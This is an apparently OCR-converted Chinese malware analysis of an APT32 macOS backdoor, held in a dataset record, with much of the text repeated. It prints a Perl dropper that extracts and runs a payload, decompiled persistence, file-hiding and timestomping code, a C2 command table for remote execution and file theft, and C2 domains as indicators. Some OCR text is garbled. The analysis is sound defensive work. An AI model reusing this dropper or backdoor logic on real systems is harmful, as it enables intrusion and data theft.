=\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "cpp*(DWORD*)(a1+29)=HandlePP::runCommand(&v20,(unsignedint)v2,&v21);", "hash_code": "6b02790b7bc12fdaef818e019f630f9d7f37170fc72802e2383169a65a920ac2", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "removefile(&v79);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  